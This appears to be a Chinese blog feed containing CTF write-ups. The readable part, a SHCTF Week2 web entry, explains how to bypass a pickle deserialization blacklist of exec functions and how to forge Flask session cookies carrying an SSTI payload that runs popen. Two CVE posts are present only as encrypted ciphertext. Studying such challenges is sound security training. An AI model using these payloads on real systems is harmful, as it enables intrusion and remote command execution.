class="hljs-comment">#fun3_a = pickle.loads(fun3_a)</span><br>            fun3_b = fun3_a[<span class="hljs-string">&quot;name&quot;</span>]<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> fun3_c:<br>            <span class="hljs-built_in">print</span>(fun3_c)<br>            fun3_b = <span class="hljs-string">&quot;Guest&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(arg3)&gt;<span class="hljs-number">35</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>, msg=<span class="hljs-string">&#x27;留言太长了！&#x27;</span>, status=<span class="hljs-string">&#x27;留言失败&#x27;</span>)<br>        arg3 = arg3.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        arg3 = arg3.replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        fun1_a = fun1(<span class="hljs-built_in">type</span>,arg3)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>,msg=fun1_a,status=<span class="hljs-string">&#x27;%s,留言成功&#x27;</span>%fun3_b)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-25763</title>
    <link href="/2025/03/30/CVE-2025-25763/"/>
    <url>/2025/03/30/CVE-2025-25763/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="忘记它 仿似遗忘密码" data-whm="只差一點點 即可以 再會面">  <script id="hbeData" type="hbeData" data-hmacdigest="e6a7f637b2ab49426307c1291b2635909c86e1864c73ad3a25242ad176ff75bf">3c21d6e14fbfd6aa4ddebc3df5ad1cd4e59ccde24a736ba8afb463f309495338eaa8c0f5d8f2c99bf1cd17d11b5a5342172affd4007ab899e4c92a0ec5c3058ed7d8fb2eb1b98ad8399484ca6b54489c763b3157db4cfe7438efb40169ebc55f56d2714c8c9245463936522a3b8553cc75b7b4990f871f6883e8481923b102bf8bcd33a83ec0e6c7f93cefaafe25adef9dc33d81633c6a4ceb5c021a2621194132d4c70219185b12f2b8299725f6f1b7bc78102073d8d1a27c57e89148cf34ece43b22d44c76eee4b1e523e29205eb85f86246f05726cdcd31da9cba4b162d364a7e79562f55c345454f8fc87bde5cde0550f00428fb7662e08d145373ac49bc326941239596180eac1e9458519155f48427b0247ae908bd3842051aaa936a4335dba6882606c073c16965a3d8733fb29dd58d80153e880b178e7868f186664a3894487c11785f563a5e42f1238f89c48d427d6b40945501666edb61deaaed7a05a995cca9e16871877df6be390f1a1e4c3ebcd9a65368080daaf901ed308ab4a8a7128f5d32914b0d8857ee9f1a4053d06f3154c72353a3bceca8ad4fb36e21e0ac10240254933fcb43eb8403f37daa9901ed013b38c90dd17f88605c105745dd455a3c37ada361d936047e337e46d36da2ce7e250f434a6b929d9dc52a6e3511139a923b7eb43665cac92d32d7427640b9fa9c795b982d6728272ad989c0e28e003c15f2048021c283f19d67f4b43dbbc863cc0ae0eeb4985c916b81b075544d4218d045a40edd7d5fa1ddc3774da344f1c62cbcea93c0dadf0b9f090618cb68ae3d5d0857f49c536621a16f05283757ec5e0d6ef8655be64058e01a9ba21441df2c647d378c39fee4aa328a0b714efb2d24d32de122fa9f3852004382a0a170bc7ce53b6dc92745751164cdcf81630d199264929320ffe35668602525403fd5d31cf708df398d38a325bbb70fc78a67ffc821c2b64444168d34c8ac179b21906c5101a589165d4ff87a038e35306c67a731ea135dfe3b844fa06f47bfadbfb4bf9fedb8832996b8a77326187b78a0f1b2ff6f0f7ae54d223bd4c03bdea829395101c9c8f10b3e308409df81b012ea3ade75ae943a11beef979a7f459de77f12892a9a3b24cbcfe48a94f2ad31cecb5a25c675398ef8db3a9dcf0a155fed2d9587b35762d657f08331fc3fa37445a44f3634a11ea390873d797a68f04763b3884cdd568f4a515f9998cab6cb2ea1a6f0481a64346867294809c006126596f2bdebdd79f6aa487ccfd21a643fd4a6829fcd175287b3f0e2a4539ce890734e5a5de6ea5856bb3e8575f640e5b9b3efb846ef0156e3321d1d398cfe1caff432797da9cc339b10fa6c27ba4d8a7579d486c0721e7b2ad95b636740ccbc81bc198f58ada8e06cb656ff140ed01e713fe90a29d77b19bf7d9dbe8976ff0d0b4b4a895d9fab8aa087eed27558e3aca65adefb48dd396f428dbfca0f0ff88e075a00cca37284da49407ea31c5cf107aa3a77ded588be7df60e1b07c5e425770c61d9bf80aa6a80ab42b7ecd5f616a6db1e3b6472337f87519db3608015d03e69048a80748046089a9e9d25b47c8f3a31dba5a96b9b066efae045b254b5cd2de67724e226edc6e7571d6576119b8ddf6de7bf1194fe10a3c7967ff3a5a920365428ab5ed5cf09164d54e1faa1e284408a47c0c67abfb4dac897bf0411a856405518241c1554d03344ec6e76c9893a660ab42d717298bb8e571fb3ed486345baee454b59f65e0ebf1e56a6eff98d6b523b7d522927eed2bed18a42c6ec7eded1154392cce991dceb80bd7db470045154ae040c682bdc62283b52375c40ffe4e937c3fe6541e99cf0b246f19fd59cfd4df286beb6bb6d641a4267f704bcd78bc4cb0b0a45cb3afae6a4c8f925bf55b1613f455c675c41acf7e74ce8634b08250dbd9525a59a78256b9f94f695cb6d390157c4491ca32c333ae12d1c488b0fde56f34fd5fb699dd322c6443af9c3a5883618f75f040285c265f7255e6b43b5e841e87e235cacb681b2ae7bcba7c89fddc5d92b2954e706f6a39360a8c9aede55526612d3cd1864a83ef4904fd89dcbf8fd53b6fcbf25f600188bd6299aefc3617526120734d0551810370c2a8cae506262a8e66d9f972d88de267a2323b64b8b392a4cc87c6a57d32f90cc36aca590b1f8144f64b69d2a092a7b105143466feba9f05dc25f92772dc41f8231cb028db24eb85d0b2f534dd9fb9474a68d906b5eb555db7f6bbc25090263fe0a4e48a11d8dcc3f95714305a21157c91b698c5f2573e986a5841357335fb011bbe0ffe6464022cc374c964d9bf05e0d7211752d05d205e9ac8ff83270e87abd1ef73f67d1986ca64890</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-up">      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-up">无密码 方可以忘记它</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Dig</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHCTF week2-web</title>
    <link href="/2025/02/20/shctf-Week2/"/>
    <url>/2025/02/20/shctf-Week2/</url>
    
    <content type="html"><![CDATA[<h3 id="shctf-Week2-dickle"><a href="#shctf-Week2-dickle" class="headerlink" title="shctf [Week2]dickle"></a>shctf [Week2]dickle</h3><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> io<br><br>BLACKLISTED_CLASSES = [<br>    <span class="hljs-string">&#x27;subprocess.check_output&#x27;</span>,<span class="hljs-string">&#x27;builtins.eval&#x27;</span>,<span class="hljs-string">&#x27;builtins.exec&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.system&#x27;</span>, <span class="hljs-string">&#x27;os.popen&#x27;</span>, <span class="hljs-string">&#x27;os.popen2&#x27;</span>, <span class="hljs-string">&#x27;os.popen3&#x27;</span>, <span class="hljs-string">&#x27;os.popen4&#x27;</span>, <br>    <span class="hljs-string">&#x27;pickle.load&#x27;</span>, <span class="hljs-string">&#x27;pickle.loads&#x27;</span>, <span class="hljs-string">&#x27;cPickle.load&#x27;</span>, <span class="hljs-string">&#x27;cPickle.loads&#x27;</span>, <br>    <span class="hljs-string">&#x27;subprocess.call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>, <br>    <span class="hljs-string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getstatus&#x27;</span>, <br>    <span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;posixfile.open&#x27;</span>, <span class="hljs-string">&#x27;posixfile.fileopen&#x27;</span>,<br>    <span class="hljs-string">&#x27;__import__&#x27;</span>,<span class="hljs-string">&#x27;os.spawn*&#x27;</span>,<span class="hljs-string">&#x27;sh.Command&#x27;</span>,<span class="hljs-string">&#x27;imp.load_module&#x27;</span>,<span class="hljs-string">&#x27;builtins.compile&#x27;</span><br>    <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;builtins.execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;builtins.open&#x27;</span>, <span class="hljs-string">&#x27;builtins.file&#x27;</span>, <span class="hljs-string">&#x27;os.system&#x27;</span>, <br>    <span class="hljs-string">&#x27;os.fdopen&#x27;</span>, <span class="hljs-string">&#x27;os.tmpfile&#x27;</span>, <span class="hljs-string">&#x27;os.fchmod&#x27;</span>, <span class="hljs-string">&#x27;os.fchown&#x27;</span>, <span class="hljs-string">&#x27;os.open&#x27;</span>, <span class="hljs-string">&#x27;os.openpty&#x27;</span>, <span class="hljs-string">&#x27;os.read&#x27;</span>, <span class="hljs-string">&#x27;os.pipe&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.chdir&#x27;</span>, <span class="hljs-string">&#x27;os.fchdir&#x27;</span>, <span class="hljs-string">&#x27;os.chroot&#x27;</span>, <span class="hljs-string">&#x27;os.chmod&#x27;</span>, <span class="hljs-string">&#x27;os.chown&#x27;</span>, <span class="hljs-string">&#x27;os.link&#x27;</span>, <span class="hljs-string">&#x27;os.lchown&#x27;</span>, <span class="hljs-string">&#x27;os.listdir&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.lstat&#x27;</span>, <span class="hljs-string">&#x27;os.mkfifo&#x27;</span>, <span class="hljs-string">&#x27;os.mknod&#x27;</span>, <span class="hljs-string">&#x27;os.access&#x27;</span>, <span class="hljs-string">&#x27;os.mkdir&#x27;</span>, <span class="hljs-string">&#x27;os.makedirs&#x27;</span>, <span class="hljs-string">&#x27;os.readlink&#x27;</span>, <span class="hljs-string">&#x27;os.remove&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.removedirs&#x27;</span>, <span class="hljs-string">&#x27;os.rename&#x27;</span>, <span class="hljs-string">&#x27;os.renames&#x27;</span>, <span class="hljs-string">&#x27;os.rmdir&#x27;</span>, <span class="hljs-string">&#x27;os.tempnam&#x27;</span>, <span class="hljs-string">&#x27;os.tmpnam&#x27;</span>, <span class="hljs-string">&#x27;os.unlink&#x27;</span>, <span class="hljs-string">&#x27;os.walk&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.execl&#x27;</span>, <span class="hljs-string">&#x27;os.execle&#x27;</span>, <span class="hljs-string">&#x27;os.execlp&#x27;</span>, <span class="hljs-string">&#x27;os.execv&#x27;</span>, <span class="hljs-string">&#x27;os.execve&#x27;</span>, <span class="hljs-string">&#x27;os.dup&#x27;</span>, <span class="hljs-string">&#x27;os.dup2&#x27;</span>, <span class="hljs-string">&#x27;os.execvp&#x27;</span>, <span class="hljs-string">&#x27;os.execvpe&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.fork&#x27;</span>, <span class="hljs-string">&#x27;os.forkpty&#x27;</span>, <span class="hljs-string">&#x27;os.kill&#x27;</span>, <span class="hljs-string">&#x27;os.spawnl&#x27;</span>, <span class="hljs-string">&#x27;os.spawnle&#x27;</span>, <span class="hljs-string">&#x27;os.spawnlp&#x27;</span>, <span class="hljs-string">&#x27;os.spawnlpe&#x27;</span>, <span class="hljs-string">&#x27;os.spawnv&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.spawnve&#x27;</span>, <span class="hljs-string">&#x27;os.spawnvp&#x27;</span>, <span class="hljs-string">&#x27;os.spawnvpe&#x27;</span>, <span class="hljs-string">&#x27;pickle.load&#x27;</span>, <span class="hljs-string">&#x27;pickle.loads&#x27;</span>, <span class="hljs-string">&#x27;cPickle.load&#x27;</span>, <span class="hljs-string">&#x27;cPickle.loads&#x27;</span>,<br>    <span class="hljs-string">&#x27;subprocess.call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_output&#x27;</span>, <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>,<br>    <span class="hljs-string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getstatus&#x27;</span>, <span class="hljs-string">&#x27;glob.glob&#x27;</span>,<br>    <span class="hljs-string">&#x27;linecache.getline&#x27;</span>, <span class="hljs-string">&#x27;shutil.copyfileobj&#x27;</span>, <span class="hljs-string">&#x27;shutil.copyfile&#x27;</span>, <span class="hljs-string">&#x27;shutil.copy&#x27;</span>, <span class="hljs-string">&#x27;shutil.copy2&#x27;</span>, <span class="hljs-string">&#x27;shutil.move&#x27;</span>,<br>    <span class="hljs-string">&#x27;shutil.make_archive&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen2&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen3&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen4&#x27;</span>, <span class="hljs-string">&#x27;timeit.timeit&#x27;</span>, <span class="hljs-string">&#x27;sys.call_tracing&#x27;</span>,<br>    <span class="hljs-string">&#x27;code.interact&#x27;</span>, <span class="hljs-string">&#x27;code.compile_command&#x27;</span>, <span class="hljs-string">&#x27;codeop.compile_command&#x27;</span>, <span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;posixfile.open&#x27;</span>,<br>    <span class="hljs-string">&#x27;posixfile.fileopen&#x27;</span><br>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;module&#125;</span>.<span class="hljs-subst">&#123;name&#125;</span>&quot;</span> <span class="hljs-keyword">in</span> BLACKLISTED_CLASSES:<br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;Forbidden class: %s.%s&quot;</span> % (module, name))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().find_class(module, name)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        encoded_data = request.form[<span class="hljs-string">&quot;data&quot;</span>]<br>        decoded_data = base64.b64decode(encoded_data)<br>        <br>        <span class="hljs-keyword">try</span>:<br>            data_stream = io.BytesIO(decoded_data)<br>            unpickler = SafeUnpickler(data_stream)<br>            result = unpickler.load()<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Deserialized data: <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(result)&#125;</span>&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error during deserialization: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;data&quot;&gt;Enter your serialized data:&lt;/label&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;textarea id=&quot;data&quot; name=&quot;data&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>waf看着很长，其实是幌子，实际上治标不治本</p><p>没有过滤<code>__reduce__</code>，这个方法在序列化时会被调用</p><p>分析过滤类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeUnpickler</span>(pickle.Unpickler): <span class="hljs-comment">#表示SafeUnpickler继承pickle.Unpickler</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>): <span class="hljs-comment">#重写 find_class 方法 用做过滤</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;module&#125;</span>.<span class="hljs-subst">&#123;name&#125;</span>&quot;</span> <span class="hljs-keyword">in</span> BLACKLISTED_CLASSES: <br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;Forbidden class: %s.%s&quot;</span> % (module, name))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().find_class(module, name)  <span class="hljs-comment">#调用父类方法 也就是正常pickle反序列化</span><br></code></pre></td></tr></table></figure><p> 在反序列化过程中，如果 <code>pickle</code> 模块遇到一个表示类的标记，它会调用 <code>find_class</code> 方法来查找和创建相应的类实例。</p><p><code>find_class</code> 方法将识别到的 <code>module</code> 和 <code>name</code> 取决于 <code>__reduce__</code> 方法返回的内容。</p><p><code>module</code>是类的模块名，例如 “<code>os</code>“。<code>name</code>是类名，例如 “<code>system</code>“</p><p>如果反序列化后执行的是<code>os.system</code>则会被禁止，抛出异常</p><p>如果你想直接<code>return (eval, (&quot;__import__(&#39;os&#39;).popen(&#39;tac /flag&#39;).read()&quot;,))</code>是行不通的</p><p>本地调试</p><p>在过滤类打印<code>find_class</code></p><p><img src="/mdimg/shctfweek2/1728490095306-75fed041-6e50-4228-9a02-4d14bd69cd85.png"></p><p><img src="/mdimg/shctfweek2/1729065904479-ceef71e7-85e7-4ac1-8c75-56690f457716.jpeg"></p><p><code>find_class</code> 解析的是 <code>posix.system</code> 而不是 <code>os.system</code></p><p>在反序列化过程中， pickle 使用 <code>find_class</code> 方法来定位和导入必要的类或函数。由于 pickle 记录的是 <code>posix.system</code>，因此<code> find_class</code> 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。</p><p>所以可以用<code>os.system</code></p><p>当然<code>os.system </code>执行结果只会显示在服务端，客户端返回的是退出状态码也就是执行成功为0，不会返回执行结果</p><p>所以要反弹shell</p><p><img src="/mdimg/shctfweek2/1728483888146-6bf0e191-aea5-4503-b68b-71da39ce4f68.png"></p><h3 id="Week2-入侵者禁入"><a href="#Week2-入侵者禁入" class="headerlink" title="[Week2]入侵者禁入"></a>[Week2]入侵者禁入</h3><p>session伪造、ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, render_template_string <br>app = Flask(__name__) <br>app.secret_key = <span class="hljs-string">&#x27;0day_joker&#x27;</span> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>    session[<span class="hljs-string">&#x27;role&#x27;</span>] = &#123; <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-string">&#x27;your_flag_here&#x27;</span> &#125; <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file: <br>        code = file.read() <br>        <span class="hljs-keyword">return</span> code <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_handler</span>(): <br>        <span class="hljs-keyword">try</span>: <br>            role = session.get(<span class="hljs-string">&#x27;role&#x27;</span>) <br>            <span class="hljs-built_in">print</span>(role)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(role, <span class="hljs-built_in">dict</span>): <br>                <span class="hljs-keyword">raise</span> Exception <br>        <span class="hljs-keyword">except</span> Exception: <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Without you, you are an intruder!&#x27;</span> <br>        <span class="hljs-keyword">if</span> role.get(<span class="hljs-string">&#x27;is_admin&#x27;</span>) == <span class="hljs-number">1</span>: <br>            flag = role.get(<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;admin&#x27;</span> <br>            message = <span class="hljs-string">&quot;Oh,I believe in you! The flag is: %s&quot;</span> % flag <br>            <span class="hljs-keyword">return</span> render_template_string(message) <br>        <span class="hljs-keyword">else</span>: <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: You don&#x27;t have the power!&quot;</span> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p><code>[https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)</code></p><p>知道secret_key直接构造session，先解session</p><p><code>python3 flask_session_cookie_manager3.py decode -s &#39;0day_joker&#39; -c &#39;eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.Zw6NhA.pRHC2qR5Y51O6ozJrrmIlpJaFrc&#39;</code></p><p><img src="/mdimg/shctfweek2/1729008498155-53206e87-8b8c-456f-b1d4-532a180535ce.png"></p><p>构造session</p><p><code>python3 flask_session_cookie_manager3.py encode  -s &#39;0day_joker&#39; -t &quot;&#123;&#39;role&#39;: &#123;&#39;flag&#39;: &#39;&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125;&#39;, &#39;is_admin&#39;: 1&#125;&#125;&quot;</code></p><p><code>.eJyrVirKz0lVsqpWSstJTFeyUqqujo7Vi49PzkksLo6PB7KSEotTgaxoA5BwcWkSWAYkoqFZW6uko5RZHJ-YkpuZp2RlWFsLAFUDG9c.Zw6U2Q.PrL0RzrhMuUdUo5n-YvDce8Q2H0</code></p><p>第138个<code>&gt;</code>说明<code>os.wrap</code>在第137个（列表从0开始，ctrl+f从1开始所以要-1）</p><p><img src="/mdimg/shctfweek2/1729008640337-c0d14379-0530-4d1e-83f4-7994e15d2985.png"></p><p>通过<code>.__init__.__globals__.popen</code>调用<code>popen</code>方法</p><p>因为用单引号会报错，不能通过<code>popen(&#39;cat /f*&#39;)</code>来执行系统命令</p><p>所以用传参来绕过</p><p>在 Flask 中，<code>request.args</code> 是一个包含所有查询字符串参数的列表</p><p><code>request.args.a</code>表示a参数的值</p><p><code>python3 flask_session_cookie_manager3.py encode  -s &#39;0day_joker&#39; -t &quot;&#123;&#39;role&#39;: &#123;&#39;flag&#39;: &#39;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[137].__init__.__globals__.popen(request.args.a).read()&#125;&#125;&#39;, &#39;is_admin&#39;: 1&#125;&#125;&quot;</code></p><p><code>.eJwdi0EKwyAQRe8yK4UiDV0UvIqUYWymIkw1dZKVePfG7B7vv9-hVWHwHT5CCTz0Hl4O8S2kinhSJOWTwn1qPeK1TGNsWB7PaXPJ-9UmqZFk_ra6cTGNfwfr7qgldWRdY1qNHQNukBVp_eYCfhnjD3qJL0U.Zw9wdQ.pgUNXO7rv0tczhfeUiBwXS32VS8</code></p><p><img src="/mdimg/shctfweek2/1729065160411-7485f38a-3970-4cb1-a4c1-561478b942e8.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-57252</title>
    <link href="/2025/01/20/CVE-2024-57252/"/>
    <url>/2025/01/20/CVE-2024-57252/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="忘记它 仿似遗忘密码" data-whm="只差一點點 即可以 再會面">  <script id="hbeData" type="hbeData" data-hmacdigest="3c6140f63e9c7234776d2bb4140805d48e8d41fe5dcedfe3c471d1cf7dce5738">3c21d6e14fbfd6aa4ddebc3df5ad1cd431153cce6740daf60748b7f8fd180c743bbb66d0d10dde8a0d74afe78463121db4edbf336da47166bee9cabf0235671f6acfb51edcadcf09b5fee838a8ab22167bbecf6922ab85a3805e675236913e51c60058cbbedae75dca8a4044edb0cc1978ef7275aa64f47d31f0ebf7f781646027a30e953b2c5051d97efc4d65dbf8ec56329dcd82afaf76ff027affd627cee72a2bd13203ac71965380375f7815bc0934f08cd7de09afd33ed0ff469d647a1457ce5e3595b4f805761ad92587125f0c49b243709795d1907d90560e0e55365ea0edf72158b0782f5ec6d559ebe1e48a3e3081ceffd7241d253933640af0e4a3964b6728ea1d7c9a293c3dda793a33fa4a3ae51c6c72b3feb6fd845a85918d5b3348a4251aa8ea6b9da126c7f17f31f60db506822c1d3bd7bec3294939f45aa66d997a24660cc485f7660bd334098618fea48f5751399a3337d218795b1b3fa84761cdcfe155cf5436ce46d1cabdacf3472a88ae3bdd44d3bd7874a4dd61e6e45afeecdf2afaef230c58eb888edf3922b10d80a9a539bed88b6a45bf00e5f71c0366efde7f787f9ac04f188fa880aabb0b21d5e2e2d7a3eaf7e34cb9dd6d06162efaa7fdbc16f1afb3033487c1d72c6eacb9c5d317bcbc443fbac4f82d8871b589842b66f295722ca9288c72540c765885d74b212db9c24a3f633eeeecd9532648b49c6f46900acc73baa6cf9f98e4beddecddac16b604f322ef430c07a1bbbe35c37908e6bc36f5fd3634b14dbe03fe80e9349f720b654e2ef7a3d7c1cce505b4c3be39cff2eea3a66e4a53df83e3c76b3a48fb0ee9d7c8ad132d2d5c8275d00aaf44696e3eab3aa66afbf9b4573e2e211560dbcbe7f6efd04f951424c81dbb90c84fea0fa1bf1d1fb13f2dff145d17890b0d4a7e77e1c2e1e41bfc9e62aae302eb29dd4a3737211b1437c075162dfc44ebded9baae03f9fdd75626af875fe9eccea718e199d921d4ff3366872360ae1f154e4b087272c73bc899988113fccdb2a19342eeb9479fe874ea940c63eccc38907f8e0ef7